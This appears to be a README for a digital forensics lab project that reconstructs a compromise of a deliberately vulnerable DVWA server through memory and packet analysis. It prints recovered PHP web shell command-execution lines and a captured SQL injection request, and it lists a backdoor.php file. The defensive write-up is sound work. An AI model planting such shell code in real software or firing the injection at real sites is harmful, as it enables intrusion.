# Project: Operation Volatile Mirage 🌫️

## 📌 Incident Overview

During a routine security assessment of a localized web infrastructure hosting **Damn Vulnerable Web Application (DVWA)**, anomalous runtime behaviors and suspicious process creation events were detected on the backend web server.

This project documents an end-to-end **Digital Forensics and Incident Response (DFIR)** investigation that combines:

* **Volatile memory forensics** using Volatility 3
* **Network traffic analysis** using Wireshark and TShark
* **Web application attack reconstruction**

The objective was to identify the malicious payload, determine the attacker's actions, and trace the original exploitation vector that resulted in remote command execution on the target system.

---

## 🎯 Investigation Objectives

* Identify malicious processes residing in volatile memory
* Recover and analyze attacker-deployed payloads
* Correlate host-based artifacts with network activity
* Reconstruct the intrusion timeline
* Determine the initial compromise vector
* Produce a consolidated DFIR triage report

---

## 🛠️ Tooling & Environment

| Category          | Tool                     |
| ----------------- | ------------------------ |
| Operating System  | Kali Purple              |
| Memory Forensics  | Volatility 3             |
| Symbol Generation | dwarf2json               |
| Packet Analysis   | Wireshark                |
| Stream Analysis   | TShark                   |
| Target Platform   | DVWA (Apache Web Server) |

---

## 🔎 Key Investigative Findings

### 1. Host Memory Analysis (Volatility 3)

Volatility 3 analysis revealed an embedded PHP web shell operating within the web server's runtime memory space.

#### Extracted Malicious Functions

```php
passthru($_POST['bkshell']);
shell_exec($cmd);
system($cmd);
```

These functions provided the attacker with remote command execution capabilities through HTTP POST requests.

#### Outcome

* Identified active malicious execution artifacts
* Recovered web shell contents from memory
* Confirmed attacker persistence through PHP command execution mechanisms

---

### 2. Network Stream Analysis (TShark)

Network traffic reconstruction identified a recurring communication pattern between the attacker and the compromised web server.

#### Attacker Endpoint

```text
192.168.111.148
```

#### Target Server

```text
192.168.111.154
```

#### Transport Characteristics

* Protocol: HTTP
* Destination Port: 80/TCP
* Session ID: TCP Stream 53796

---

### 3. Initial Exploitation Vector

Packet reconstruction revealed the original compromise attempt originated from a classic SQL Injection (SQLi) attack targeting DVWA.

#### Captured Request

```http
GET /dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit
```

#### Analysis

The payload translates to:

```sql
' OR '1'='1
```

This SQL Injection bypass technique attempts to manipulate application logic and retrieve unauthorized database results.

---

## 📂 Repository Structure

```text
hunting_web_shells/
│
├── exploits/
│   └── backdoor.php
│
├── pcaps/
│   └── cooper-grill-dvwa.pcapng
│
├── screenshots/
│   ├── 01_The_Active_Runtime_Triage.png
│   ├── 02_Proof_of_Optimization.png
│   ├── 03_The_Resulting_Artifacts.png
│   ├── 04_net_traffic_conversations.png
│   ├── 05_net_tcp_sessions.png
│   └── 06_net_sqli_exploit_vector.png
│
├── tools/
│   └── run_hunt.sh
│
├── triage_analysis_report.txt
├── web_shell_kernel.json
└── README.md
```

---

## 📸 Visual Evidence

### 01 — Active Runtime Triage

Volatility 3 execution scanning host memory for suspicious processes and artifacts.

### 02 — Proof of Optimization

Benchmark demonstrating reduced symbol-processing overhead through optimized kernel symbol generation.

### 03 — Resulting Artifacts

Successful extraction and recovery of the malicious PHP web shell.

### 04 — Network Traffic Conversations

High-level endpoint communication mapping using TShark.

### 05 — TCP Session Analysis

Layer 4 transport stream decomposition and session reconstruction.

### 06 — SQL Injection Exploit Vector

Captured HTTP request exposing the original SQL Injection attack.

---

## 📊 Investigation Summary

| Finding                          | Result            |
| -------------------------------- | ----------------- |
| Web Shell Located                | ✅ Yes             |
| Memory Artifacts Recovered       | ✅ Yes             |
| Attacker IP Identified           | ✅ 192.168.111.148 |
| Initial Attack Vector Identified | ✅ SQL Injection   |
| Network Stream Reconstructed     | ✅ Yes             |
| DFIR Report Generated            | ✅ Yes             |

---

## 🚀 Downloads

### Evidence Package

Place downloadable files inside the repository Releases section and update the links below:

* Memory Analysis Report
* Packet Capture (PCAPNG)
* Kernel Symbol Profile
* Extracted Web Shell Samples

---

## ⚠️ Disclaimer

This project was conducted in a controlled lab environment using intentionally vulnerable systems for educational, research, and defensive security training purposes. The techniques demonstrated are intended exclusively for authorized security testing and incident response activities.

---

## 👨‍💻 Author

DFIR • Threat Hunting • Memory Forensics • Incident Response

**Operation Volatile Mirage** demonstrates how volatile memory analysis and network forensics can be combined to reconstruct attacker activity and identify the root cause of a web server compromise.
